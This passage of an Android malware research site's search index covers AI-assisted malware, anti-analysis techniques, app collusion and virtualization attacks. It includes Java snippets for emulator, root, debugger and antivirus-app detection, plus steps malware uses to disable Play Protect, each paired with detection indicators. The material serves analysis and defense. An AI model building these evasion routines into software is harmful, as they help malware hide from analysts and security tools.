problem-space transformations from benign donors 80-95% with 1-9 queries LAMLAD arXiv 2024 Dual-agent LLM (manipulator + analyzer) bypassing ML classifiers Up to 97% in 3 attempts RL-based evasion Alexandria Engineering Journal 2024 GANs + PPO reinforcement learning generating adversarial payloads 53.84% vs gradient-boosted decision trees"},{"location":"attacks/ai-assisted-malware/#vendor-reports","title":"Vendor Reports","text":"Report Organization Date Key Finding Influence and Cyber Operations OpenAI October 2024 20+ instances of threat actor misuse including STORM-0817 Android malware Disrupting Malicious Uses OpenAI February 2025 Continued fraud schemes and state-sponsored abuse documentation AI Security Report 2025 Check Point April 2025 AI used across entire cyber attack lifecycle from code generation to campaign optimization Advances in Threat Actor Usage Google GTIG November 2025 Novel AI-enabled malware families (PROMPTFLUX, PROMPTLOCK) with runtime LLM calls The Dual-Use Dilemma Unit 42 2025 Underground forums selling custom, jailbroken, and open-source AI hacking tools 2024 Phishing Intelligence Report SlashNext 2024 Credential phishing attacks increased 703% in H2 2024; AI a key driver"},{"location":"attacks/ai-assisted-malware/#what-is-confirmed-vs-theoretical","title":"What Is Confirmed vs. Theoretical","text":"Status Category Observed in the wild LLM-assisted malware code writing (STORM-0817, HP Wolf Security AsyncRAT) Observed in the wild Facial biometric theft for deepfake banking fraud (GoldPickaxe) Observed in the wild Underground malicious LLM tools sold and used (WormGPT, FraudGPT, KawaiiGPT) Observed in the wild Runtime LLM integration in malware (PROMPTFLUX, PROMPTLOCK, PROMPTSTEAL) Observed in the wild AI-generated phishing at scale (703% increase in credential phishing) Academic PoC only GAN/RL-based adversarial attacks against Android malware ML detectors Unverified DarkBERT malicious derivatives Not yet observed Android malware autonomously conducting AI voice cloning attacks"},{"location":"attacks/anti-analysis-techniques/","title":"Anti-Analysis Techniques","text":"<p>Detecting and evading analysis environments, security tools, and human researchers. Nearly every modern Android banking trojan implements multiple layers of anti-analysis checks before executing any malicious behavior. The goal is simple: if the malware suspects it is being analyzed, it does nothing, resulting in a clean verdict from automated sandboxes and wasted hours for manual analysts.</p> <p>See also: Play Store Evasion, Dynamic Code Loading, Persistence Techniques</p>"},{"location":"attacks/anti-analysis-techniques/#emulator-detection","title":"Emulator Detection","text":"<p>The most common first check. Emulators expose artifacts through build properties, hardware fingerprinting, telephony state, and sensor data that differ from physical devices.</p>"},{"location":"attacks/anti-analysis-techniques/#build-property-checks","title":"Build Property Checks","text":"<pre><code>private boolean isEmulator() {\n    return Build.FINGERPRINT.contains(\"generic\")\n        || Build.MODEL.contains(\"google_sdk\")\n        || Build.MODEL.contains(\"Emulator\")\n        || Build.MODEL.contains(\"Android SDK built for x86\")\n        || Build.MANUFACTURER.contains(\"Genymotion\")\n        || Build.HARDWARE.contains(\"goldfish\")\n        || Build.HARDWARE.contains(\"ranchu\")\n        || Build.PRODUCT.contains(\"sdk_gphone\")\n        || Build.BOARD.contains(\"unknown\")\n        || Build.HOST.startsWith(\"Build\");\n}\n</code></pre> <p>Families like Cerberus, Anatsa, and Hook check 10-20+ build properties. The check is trivial to implement but also trivial to bypass via Frida property spoofing on a physical device.</p>"},{"location":"attacks/anti-analysis-techniques/#telephony-checks","title":"Telephony Checks","text":"Check Emulator Value Real Device Value <code>getDeviceId()</code> <code>000000000000000</code> or null Valid IMEI <code>getSimSerialNumber()</code> Empty or <code>89014103211118510720</code> Valid ICCID <code>getNetworkOperatorName()</code> <code>Android</code> or empty Carrier name <code>getSimOperator()</code> Empty MCC+MNC code <code>getLine1Number()</code> <code>15555215554</code> (emulator default) Real number or empty <code>getSubscriberId()</code> Empty Valid IMSI"},{"location":"attacks/anti-analysis-techniques/#file-system-artifacts","title":"File System Artifacts","text":"<pre><code>private boolean checkEmulatorFiles() {\n    String[] knownPaths = {\n        \"/dev/socket/qemud\",\n        \"/dev/qemu_pipe\",\n        \"/system/lib/libc_malloc_debug_qemu.so\",\n        \"/sys/qemu_trace\",\n        \"/system/bin/qemu-props\",\n        \"/dev/goldfish_pipe\"\n    };\n    for (String path : knownPaths) {\n        if (new File(path).exists()) return true;\n    }\n    return false;\n}\n</code></pre>"},{"location":"attacks/anti-analysis-techniques/#sensor-based-detection","title":"Sensor-Based Detection","text":"<p>Trend Micro documented malware using motion sensor data to distinguish real phones from emulators. BatterySaverMobi and Currency Converter (discovered on Play Store) checked accelerometer readings -- emulators return static or zero values because they don't simulate physical motion. The malware only activated its dropper payload after detecting non-zero accelerometer variance over time.</p> <p>SpinOk SDK used gyroscope and magnetometer data as anti-emulation checks before activating its data harvesting across 193 apps with 451 million downloads.</p>"},{"location":"attacks/anti-analysis-techniques/#hardware-property-checks","title":"Hardware Property Checks","text":"Property Emulator Physical <code>BOARD</code> <code>unknown</code>, <code>goldfish</code> Device-specific <code>BOOTLOADER</code> <code>unknown</code> Version string <code>DEVICE</code> <code>generic</code>, <code>generic_x86</code> Device codename <code>HARDWARE</code> <code>goldfish</code>, <code>ranchu</code> <code>qcom</code>, <code>exynos</code>, etc. CPU ABI <code>x86</code>, <code>x86_64</code> (common in AVDs) <code>arm64-v8a</code> (most real devices) Battery temperature Static (usually 0) Varies with use Battery status Always <code>CHARGING</code> Varies"},{"location":"attacks/anti-analysis-techniques/#root-and-magisk-detection","title":"Root and Magisk Detection","text":"<p>Banking trojans detect rooted devices for two reasons: to avoid analysis environments (analysts use rooted devices), and to determine available exploitation paths.</p>"},{"location":"attacks/anti-analysis-techniques/#common-root-checks","title":"Common Root Checks","text":"<pre><code>private boolean isRooted() {\n    String[] paths = {\n        \"/system/app/Superuser.apk\",\n        \"/system/xbin/su\",\n        \"/system/bin/su\",\n        \"/sbin/su\",\n        \"/data/local/xbin/su\",\n        \"/data/local/bin/su\"\n    };\n    for (String path : paths) {\n        if (new File(path).exists()) return true;\n    }\n    try {\n        Runtime.getRuntime().exec(\"su\");\n        return true;\n    } catch (IOException e) {\n        return false;\n    }\n    return false;\n}\n</code></pre>"},{"location":"attacks/anti-analysis-techniques/#magisk-detection","title":"Magisk Detection","text":"Technique What It Detects Bypass Check for <code>/sbin/.magisk</code>, <code>/data/adb/magisk</code> Magisk installation directory MagiskHide / Shamiko Mount namespace inspection (<code>/proc/self/mounts</code>) Magisk mount overlays DenyList + Shamiko Check <code>ro.boot.vbmeta.device_state</code> Unlocked bootloader Cannot spoof without re-locking <code>PackageManager.getInstalledPackages()</code> for <code>com.topjohnwu.magisk</code> Magisk Manager app Randomize package name (built-in Magisk feature) SELinux status (<code>getenforce</code>) Permissive mode (common on rooted) Enforce mode on properly configured root"},{"location":"attacks/anti-analysis-techniques/#safetynet-play-integrity","title":"SafetyNet / Play Integrity","text":"<p>Some malware checks Play Integrity attestation before executing, refusing to operate on devices that fail hardware attestation. This is unusual (most malware avoids Google APIs) but has been observed in families that want to ensure they are running on a real, unmodified device to maximize fraud success.</p>"},{"location":"attacks/anti-analysis-techniques/#frida-detection","title":"Frida Detection","text":"<p>Frida is the primary dynamic instrumentation tool used by Android researchers. Detecting it is a priority for any malware that wants to resist analysis.</p>"},{"location":"attacks/anti-analysis-techniques/#detection-techniques","title":"Detection Techniques","text":"Technique Implementation Reliability Default port scan Connect to <code>localhost:27042</code> (frida-server default) Low (easily changed) <code>/proc/self/maps</code> scan Read memory mappings, search for <code>frida-agent</code>, <code>frida-gadget</code> Medium Process enumeration List running processes for <code>frida-server</code>, <code>frida-helper</code> Medium Named pipe detection Check <code>/proc/self/fd/</code> for <code>linjector</code> pipes Medium <code>pthread</code> enumeration Scan thread names for frida-related strings Medium-High Library detection <code>dlopen</code> check for <code>frida-agent.so</code> in memory Medium Inline hook detection Check function prologues for <code>0xd503201f</code> (NOP sled) or trampolines High"},{"location":"attacks/anti-analysis-techniques/#bypass-strategies","title":"Bypass Strategies","text":"<ul> <li>Rename <code>frida-server</code> binary to a random name</li> <li>Use non-default port (<code>frida-server -l 0.0.0.0:1337</code>)</li> <li>ZygiskFrida -- loads Frida gadget via Zygisk, avoiding frida-server entirely</li> <li>Shamiko -- Zygisk module that hides root and Frida from DenyList processes</li> <li>Patch <code>/proc/self/maps</code> reads via Frida itself (hook <code>fopen</code>/<code>fgets</code> to filter frida strings)</li> </ul>"},{"location":"attacks/anti-analysis-techniques/#xposed-detection","title":"Xposed Detection","text":"Technique What It Detects Stack trace inspection <code>de.robv.android.xposed</code> in call stack Class check <code>XposedBridge</code> class loadable via reflection <code>/proc/self/maps</code> <code>XposedBridge.jar</code> mapped into process Exception handler check Xposed hooks modify exception handling chain Field count check Xposed adds hidden fields to hooked methods <p>LSPosed (modern Xposed framework) operates through Zygisk, making it harder to detect via traditional methods. Most modern malware focuses on Frida detection rather than Xposed.</p>"},{"location":"attacks/anti-analysis-techniques/#debugger-detection","title":"Debugger Detection","text":"<pre><code>private boolean isDebugged() {\n    if (Debug.isDebuggerConnected()) return true;\n    if (Debug.waitingForDebugger()) return true;\n\n    try {\n        BufferedReader reader = new BufferedReader(\n            new FileReader(\"/proc/self/status\"));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (line.startsWith(\"TracerPid:\")) {\n                int pid = Integer.parseInt(line.substring(10).trim());\n                if (pid != 0) return true;\n            }\n        }\n    } catch (Exception ignored) {}\n\n    return false;\n}\n</code></pre>"},{"location":"attacks/anti-analysis-techniques/#timing-based-detection","title":"Timing-Based Detection","text":"<p>Malware measures execution time of code blocks. Under a debugger or instrumentation framework, execution is significantly slower. MITRE ATT&amp;CK T1497.003 documents this as \"Time Based Evasion.\"</p> <pre><code>long start = SystemClock.uptimeMillis();\nperformDecoyComputation();\nlong elapsed = SystemClock.uptimeMillis() - start;\nif (elapsed &gt; THRESHOLD) {\n    // Likely under instrumentation\n}\n</code></pre>"},{"location":"attacks/anti-analysis-techniques/#av-and-security-app-detection","title":"AV and Security App Detection","text":"<p>Malware checks for installed security apps to decide whether to activate. Some families disable Play Protect via accessibility before proceeding.</p>"},{"location":"attacks/anti-analysis-techniques/#package-name-checks","title":"Package Name Checks","text":"<pre><code>private boolean hasSecurityApp() {\n    String[] avPackages = {\n        \"com.avast.android.mobilesecurity\",\n        \"com.eset.ems2.gp\",\n        \"com.kaspersky.security.cloud\",\n        \"com.bitdefender.security\",\n        \"org.malwarebytes.antimalware\",\n        \"com.symantec.mobilesecurity\",\n        \"com.lookout\",\n        \"com.zimperium.zips\",\n        \"com.trendmicro.tmmspersonal\",\n        \"com.drweb.pro\"\n    };\n    PackageManager pm = getPackageManager();\n    for (String pkg : avPackages) {\n        try {\n            pm.getPackageInfo(pkg, 0);\n            return true;\n        } catch (NameNotFoundException ignored) {}\n    }\n    return false;\n}\n</code></pre>"},{"location":"attacks/anti-analysis-techniques/#play-protect-suppression","title":"Play Protect Suppression","text":"<p>Multiple families use accessibility to disable Google Play Protect:</p> <ol> <li>Open <code>Settings &gt; Security &gt; Google Play Protect</code></li> <li>Click the gear icon</li> <li>Disable \"Scan apps with Play Protect\"</li> <li>Confirm the dialog</li> </ol> <p>Anatsa, Cerberus, Hook, and Xenomorph all implement this flow. See Notification Suppression for how malware also suppresses Play Protect warnings.</p>"},{"location":"attacks/anti-analysis-techniques/#geographic-and-locale-checks","title":"Geographic and Locale Checks","text":"<p>Malware avoids executing in researcher-common locales or countries where the operator has no targets. Covered in depth in Play Store Evasion.</p> Check API Spoofing Difficulty SIM country <code>TelephonyManager.getSimCountryIso()</code> High (requires physical SIM) Network country <code>TelephonyManager.getNetworkCountryIso()</code> High (VPN doesn't change this) IP geolocation Server-side check Medium (VPN changes IP) System locale <code>Locale.getDefault()</code> Low (Settings change) Timezone <code>TimeZone.getDefault()</code> Low (Settings change) <p>Anatsa campaigns specifically avoid Eastern European and Chinese IP ranges. Mandrake used C2-side geofencing to avoid delivering payloads to non-target regions entirely.</p>"},{"location":"attacks/anti-analysis-techniques/#apk-and-manifest-corruption","title":"APK and Manifest Corruption","text":""},{"location":"attacks/anti-analysis-techniques/#malformed-zip-headers","title":"Malformed ZIP Headers","text":"<p>TrickMo uses malformed ZIP files combined with JSONPacker. The corrupted ZIP structure causes analysis tools (apktool, JADX, unzip) to fail or produce incomplete output, while the Android runtime tolerates the malformations and installs the APK normally. Cleafy documented this as a deliberate anti-analysis layer across 40+ variants.</p>"},{"location":"attacks/anti-analysis-techniques/#manifest-corruption","title":"Manifest Corruption","text":"<p>SoumniBot injects malformed compression parameters into <code>AndroidManifest.xml</code>. Android's parser tolerates the corruption; analysis tools crash. Kaspersky documented three specific techniques: invalid compression method values, invalid manifest size declarations, and oversized namespace strings.</p>"},{"location":"attacks/anti-analysis-techniques/#oversized-dex-headers","title":"Oversized DEX Headers","text":"<p>Some families pad DEX files with junk data that exceeds parser buffer sizes in analysis tools but is safely ignored by ART.</p>"},{"location":"attacks/anti-analysis-techniques/#code-level-obfuscation","title":"Code-Level Obfuscation","text":"Technique Effect Families String encryption C2 URLs, package names encrypted at rest, decrypted at runtime Anatsa (DES), Mandrake, most families Reflection-based API calls Method names resolved via strings at runtime, invisible to static analysis Octo, Xenomorph Native code for sensitive ops Key operations in <code>.so</code> libraries, harder to decompile Mandrake (OLLVM), Octo2 Control flow flattening Switch-based dispatch obscures actual execution order Commercial packers, DexGuard Dead code injection Junk methods/classes inflate the codebase Joker, crypter outputs Class/method renaming <code>a.b.c.d()</code> instead of meaningful names Nearly universal (ProGuard/R8 baseline) Dynamic class loading Payload classes loaded from encrypted assets or C2 at runtime Anatsa, Necro, SharkBot"},{"location":"attacks/anti-analysis-techniques/#domain-generation-algorithms","title":"Domain Generation Algorithms","text":"<p>Octo2 introduced DGA-based C2 resolution, generating domain names algorithmically so that blocking individual domains is ineffective. The DGA seed and algorithm are embedded in a dynamically loaded native library, adding another analysis layer.</p>"},{"location":"attacks/anti-analysis-techniques/#families-by-anti-analysis-depth","title":"Families by Anti-Analysis Depth","text":"Family Emulator Root/Magisk Frida Debugger AV Check Geo Obfuscation Anatsa Yes Yes Yes Yes Yes Yes DES strings, native loader Mandrake Yes Yes Yes Yes Yes Yes OLLVM native, multi-year dormancy Octo/Octo2 Yes Yes Yes Yes Yes Yes DGA, native library decryption Hook Yes Yes Yes Yes Yes Yes Inherited from ERMAC lineage TrickMo Yes Minimal No No Yes Yes Malformed ZIP, JSONPacker Cerberus Yes Yes Yes Yes Yes Yes Play Protect disable SpyNote Yes Yes Yes Yes Yes Minimal Restricted settings bypass GodFather Yes Yes Yes Yes Yes Yes Multi-language targeting"},{"location":"attacks/anti-analysis-techniques/#academic-research","title":"Academic Research","text":"Paper Year Key Finding A Comprehensive Survey on Android Anti-Reversing and Anti-Analysis 2024 Systematic taxonomy of 32 anti-analysis subcategories across 5 major categories DroidMorph 2024 1,771 morphed variants achieved 51.4% detection rate, meaning half evaded all AV AVPASS 2017 Leaked AV detection models to generate evasive variants; 56/58 AVs bypassed"},{"location":"attacks/anti-analysis-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Multiple <code>Build.*</code> property checks concentrated in a single method</li> <li><code>/proc/self/maps</code> or <code>/proc/self/status</code> file reads</li> <li>Hardcoded AV package name strings</li> <li><code>TelephonyManager</code> calls not related to app functionality</li> <li>Native library with OLLVM indicators (flattened control flow)</li> <li>Encrypted string arrays with runtime decryption routines</li> </ul> Dynamic Indicators <ul> <li>App silently exits or shows benign behavior in emulator but activates on physical device</li> <li>Delayed C2 contact (hours/days after install)</li> <li>Port scanning on localhost (Frida detection)</li> <li>Rapid file existence checks across <code>/dev/</code>, <code>/system/</code>, <code>/sbin/</code></li> <li><code>getInstalledPackages()</code> called early in app lifecycle</li> </ul>"},{"location":"attacks/app-collusion/","title":"App Collusion","text":"<p>Application collusion is a threat where two or more Android apps cooperate to perform a malicious action that neither could achieve independently. Each app requests only a minimal set of permissions, appearing benign in isolation. When combined on the same device, the apps aggregate permissions and share data through inter-app communication channels to achieve their goal. The real-world threat is dominated by SDK-mediated collusion, where a data broker distributes an SDK to many independent developers who unknowingly enable cross-app surveillance.</p> <p>See also: Intent Hijacking, Content Provider Attacks, Broadcast Theft, Dynamic Code Loading</p>"},{"location":"attacks/app-collusion/#why-it-matters","title":"Why It Matters","text":"<p>Android's security model is built around per-app sandboxing and permission grants. Every security check, store review, and malware scanner evaluates apps individually. Collusion exploits this blind spot: when malicious behavior is distributed across multiple apps, no single app triggers detection. Current app store review and malware scanning remain overwhelmingly single-app focused; combinatorial analysis of app pairs is computationally expensive and not performed at scale by any store.</p>"},{"location":"attacks/app-collusion/#communication-channels","title":"Communication Channels","text":""},{"location":"attacks/app-collusion/#overt-channels-designed-for-legitimate-ipc","title":"Overt Channels (Designed for Legitimate IPC)","text":"Channel Mechanism Detection Difficulty Broadcast Intents Explicit or implicit intents between apps Low (visible in manifest and at runtime) Content Providers One app exports a provider, the other queries it Low (declared in manifest) Bound Services One app exports a Service, the other binds to it Low (declared in manifest) External storage Shared filesystem (<code>/sdcard/</code>) for data exchange Medium (scoped storage limits this on Android 10+) SharedPreferences Key-value XML files if world-readable Medium (deprecated mode but still works) Local network sockets Local HTTP server on localhost High (no manifest declaration required)"},{"location":"attacks/app-collusion/#covert-channels-abuse-of-system-resources","title":"Covert Channels (Abuse of System Resources)","text":"Channel Mechanism Detection Difficulty System settings Volume, vibration, brightness as signaling Very high <code>/proc</code> filesystem CPU usage statistics, thread counts Very high Sensor data Accelerometer/vibration engine to encode data Very high UNIX socket enumeration Checking socket availability as a signal Very high External storage hidden files Identifiers written to shared filesystem High <p>Sources: Towards a threat assessment framework for apps collusion, Android Inter-App Communication: Threats, Solutions, and Challenges</p>"},{"location":"attacks/app-collusion/#two-collusion-models","title":"Two Collusion Models","text":""},{"location":"attacks/app-collusion/#1-intentional-multi-app-collusion","title":"1. Intentional Multi-App Collusion","text":"<p>A malware author deliberately splits functionality across multiple apps. Each app is purpose-built to collaborate. This is the model most studied in academic literature but less common in the wild.</p> <p>Canonical example: App A has <code>CAMERA</code> permission but no <code>INTERNET</code>. App B has <code>INTERNET</code> but no <code>CAMERA</code>. App A captures photos and passes them to App B via a shared Content Provider or external storage. App B exfiltrates them. Neither app individually appears malicious.</p>"},{"location":"attacks/app-collusion/#2-sdk-mediated-collusion","title":"2. SDK-Mediated Collusion","text":"<p>A data broker or ad-tech company distributes an SDK to many independent developers. The developers may be unaware of the SDK's full behavior. The SDK operator aggregates data from all embedding apps, achieving cross-app surveillance that no individual app could perform. This is the dominant real-world collusion model.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Prayer   \u2502  \u2502 QR       \u2502  \u2502 Speed    \u2502  \u2502 Weather  \u2502\n\u2502 App      \u2502  \u2502 Scanner  \u2502  \u2502 Trap App \u2502  \u2502 App      \u2502\n\u2502 +SDK     \u2502  \u2502 +SDK     \u2502  \u2502 +SDK     \u2502  \u2502 +SDK     \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502             \u2502             \u2502              \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                          \u2502\n                   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                   \u2502 SDK Backend \u2502\n                   \u2502 (aggregates \u2502\n                   \u2502  all data)  \u2502\n                   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"attacks/app-collusion/#real-world-cases","title":"Real-World Cases","text":""},{"location":"attacks/app-collusion/#moplus-sdk-collusion-first-confirmed-wild-collusion","title":"MoPlus SDK Collusion (First Confirmed Wild Collusion)","text":"<p>Discovered in a dataset of 50,000 apps provided by Intel Security. Presented at Virus Bulletin 2016 as the first confirmed case of malicious app collusion in the wild.</p> <p>The MoPlus SDK (by Baidu) was embedded in over 1,000 applications. The SDK opened a local HTTP server on the device, enabling a C2 operator to send arbitrary intents, obtain sensitive information, and silently install apps on rooted devices. Apps colluded by checking which one had the highest privileges via SharedPreferences, then the most-privileged app would execute commands. McAfee detected 21 apps using this collusion technique.</p>"},{"location":"attacks/app-collusion/#pixpirate-two-app-architecture","title":"PixPirate Two-App Architecture","text":"<p>PixPirate uses a genuine two-app collusion architecture. First documented by Cleafy in February 2023; the two-app technique was documented by IBM Trusteer in March 2024.</p> Component Role Downloader Visible app that the user installs. Has a launcher icon. Droppee (payload) No launcher icon, no <code>MAIN</code>/<code>LAUNCHER</code> intent-filter, invisible on home screen <p>The droppee exports a service <code>com.companian.date.sepherd</code> with intent-filter action <code>com.ticket.stage.Service</code>. The downloader uses <code>BindService</code> with <code>BIND_AUTO_CREATE</code> to launch it. Even if the downloader is deleted, the droppee persists via broadcast receivers listening for <code>BOOT_COMPLETED</code>, connectivity changes, and other system events. This is not just a dropper/payload relationship: the downloader remains an active participant in the malicious operation.</p>"},{"location":"attacks/app-collusion/#measurement-systems-sdk-us-defense-contractor-link","title":"Measurement Systems SDK (US Defense Contractor Link)","text":"<p>Wall Street Journal investigation and Bleeping Computer coverage in April 2022 revealed that Measurement Systems S. de R.L. (Panama) paid developers to embed its SDK in their apps, present in apps with at least 60 million installs including Muslim prayer apps (10M+ downloads), speed-trap detectors, and QR-code readers.</p> <p>The SDK collected precise GPS location, email addresses, phone numbers, clipboard content, and nearby device MAC addresses. Corporate records linked Measurement Systems to Vostrom Holdings and Packet Forensics, a Virginia-based defense contractor doing cyber intelligence work for US national security agencies. Discovered by researchers Joel Reardon and Serge Egelman (same researchers behind the \"50 Ways to Leak Your Data\" USENIX paper).</p>"},{"location":"attacks/app-collusion/#x-mode-social-predicio-location-data-brokers","title":"X-Mode Social / Predicio (Location Data Brokers)","text":"<p>X-Mode Social SDK collected granular location data from apps including Muslim Pro (98M+ downloads), selling data to US military contractors. Apple and Google both ordered developers to remove the SDK in December 2020.</p> <p>Predicio (France-based) was part of a supply chain funneling data: individual apps -&gt; SDK providers -&gt; middlemen -&gt; Gravy Analytics -&gt; Venntel (US government contractor selling to ICE and CBP). This represents SDK-mediated collusion at its most extreme: the SDK operator aggregates data from many independently-developed apps to build a surveillance product. EFF covered the broader implications.</p>"},{"location":"attacks/app-collusion/#spinok-sdk-trojan-module-in-100-apps","title":"SpinOk SDK (Trojan Module in 100+ Apps)","text":"<p>Dr.Web discovered SpinOk in May 2023, a trojan SDK disguised as an advertising module found in 193 apps with over 451 million cumulative downloads. Collected device sensor data, file listings, clipboard content, and could execute arbitrary JavaScript. Used anti-emulation techniques (gyroscope, magnetometer data) to avoid sandbox detection. Notable affected apps: Noizz (100M), Zapya (100M), vFly (50M), MVBit (50M). Developers embedded it unknowingly.</p>"},{"location":"attacks/app-collusion/#salmonads-sdk-imei-sharing-via-filesystem","title":"Salmonads SDK (IMEI Sharing via Filesystem)","text":"<p>Documented in \"50 Ways to Leak Your Data\" at USENIX Security 2019. Chinese developers' assistant platform that wrote the device IMEI to <code>/sdcard/.googlex9/.xamdeco0962</code>. Other apps using the same SDK but without <code>READ_PHONE_STATE</code> permission could read the IMEI from that file. Lower bound of affected installs: ~17.6 million.</p>"},{"location":"attacks/app-collusion/#cross-library-data-harvesting-xldh","title":"Cross-Library Data Harvesting (XLDH)","text":"<p>Documented at USENIX Security 2021. 42 malicious libraries inside apps detected the presence of Facebook/Twitter/Google SDKs in the same app, then invoked their API functions to steal access tokens, user profiles, and favorites. Affected more than 19,000 apps with a total of 9 billion downloads. Malicious libraries hid data in crash reports and used C2 servers to schedule exfiltration.</p>"},{"location":"attacks/app-collusion/#cve-2019-2234-googlesamsung-camera-confused-deputy","title":"CVE-2019-2234: Google/Samsung Camera Confused Deputy","text":"<p>Checkmarx discovered that a rogue app with zero camera/storage permissions could force the Google Camera app to take photos and record video (even with screen off or phone locked). Classic confused deputy: the Camera app held permissions but exposed unprotected components that any app could invoke via intents. Patched via Play Store update.</p>"},{"location":"attacks/app-collusion/#academic-research","title":"Academic Research","text":"Paper Venue Year Key Finding Analyzing Inter-Application Communication ACM MobiSys 2011 Foundational paper on intent-based security risks Towards Taming Privilege-Escalation NDSS 2012 Early work on ICC-enabled privilege escalation through colluding apps DIALDroid ACM AsiaCCS 2017 Analyzed 110,150 apps, found 23,000+ colluding app pairs in 82 minutes. Open-sourced 50 Ways to Leak Your Data USENIX Security 2019 Real-world SDK-based side channels and covert channels; Salmonads IMEI leak XLDH USENIX Security 2021 42 malicious libraries harvesting data from Facebook/Twitter/Google SDKs in 19K+ apps A Tale of Four Gates 2022 2022 52,982 instances of fourth-order privilege escalation missed by first-order analysis Covert Third-party Identifiers USENIX Security 2024 17 tracking SDKs storing persistent identifiers on external storage, defeating scoped storage"},{"location":"attacks/app-collusion/#android-platform-defenses","title":"Android Platform Defenses","text":"Defense Android Version What It Mitigates Scoped Storage Android 10 (enforced Android 11) Apps get isolated storage; prevents reading other apps' files on external storage Package Visibility Filtering Android 11 Apps cannot enumerate all installed apps; limits ability to discover colluding partners Restricted implicit intents Android 14 Implicit intents only delivered to exported components; tighter broadcast receiver controls Background execution limits Android 8.0+ Limits on background services and implicit broadcasts reduce ability to trigger colluding apps <p>Key Limitation</p> <p>All of these defenses mitigate specific channels but do not address the fundamental problem. USENIX Security 2024 research demonstrated that 17 tracking SDKs can breach Android's scoped storage defense using hidden files and media file attachment techniques. Platform defenses reduce the attack surface but cannot eliminate collusion as long as apps can communicate through any shared channel.</p>"},{"location":"attacks/app-virtualization/","title":"App Virtualization Attacks","text":"<p>Android app-level virtualization frameworks (VirtualApp, DroidPlugin, VirtualXposed) allow one app to run other apps inside a virtual container without installation. Malware abuses this to run real banking apps inside a hostile sandbox, intercepting all user input and network traffic without modifying the target APK. This eliminates the need for overlays, bypasses repackaging detection, and defeats most runtime integrity checks because the target app is unmodified.</p> <p>MITRE tracks this as T1670 - Virtualization Solution (Mobile).</p> <p>See also: Overlay Attacks, Accessibility Abuse, Play Store Evasion</p>"},{"location":"attacks/app-virtualization/#why-it-matters","title":"Why It Matters","text":"<p>Traditional banking trojans use overlay attacks to display a fake login screen on top of the real app. This has known weaknesses: Google restricts overlay permissions since Android 10, and banking apps increasingly detect overlays.</p> <p>Virtualization-based attacks eliminate overlays entirely:</p> <ol> <li>The victim interacts with the real, unmodified banking app. Every UI element, certificate check, and server response is genuine. Nothing visually fake to detect.</li> <li>The app runs inside a virtual container controlled by the malware. The virtualization engine interposes a proxy layer between the app and the Android framework.</li> <li>All user input passes through the malware's hooks. Xposed or similar frameworks inject into the virtualized app's process, capturing taps, text input, credentials, PINs, and OTPs.</li> <li>Network traffic is intercepted and modified. Hooks into HTTP libraries (OkHttpClient, etc.) let the malware read and alter API calls between the app and its backend.</li> <li>Security checks are neutralized. Root detection, integrity checks, and accessibility service detection all query the Android system, but the virtualization proxy feeds fake responses. The app \"sees\" a clean, unrooted device.</li> </ol> <p>This is fundamentally harder to detect from both the user's perspective (everything looks real) and the app's perspective (standard security checks pass).</p>"},{"location":"attacks/app-virtualization/#preconditions","title":"Preconditions","text":"Requirement Detail Installation Victim installs the malicious app (social engineering, phishing, trojanized app) No root required Virtualization operates at the application layer, not the kernel Target APK Malware downloads the target banking app's APK or copies it from the device Permissions Varies by family. Accessibility service grants additional control but is not strictly required for basic virtualization"},{"location":"attacks/app-virtualization/#how-it-works","title":"How It Works","text":""},{"location":"attacks/app-virtualization/#virtual-container-architecture","title":"Virtual Container Architecture","text":"<p>The host malware app embeds a virtualization engine (typically based on VirtualApp or DroidPlugin). This engine creates a virtual Android runtime inside the host app's process space:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Host Malware APK                       \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502  Virtualization Engine            \u2502  \u2502\n\u2502  \u2502  (VirtualApp / DroidPlugin)       \u2502  \u2502\n\u2502  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502  \u2502\n\u2502  \u2502  \u2502  Virtual Container          \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  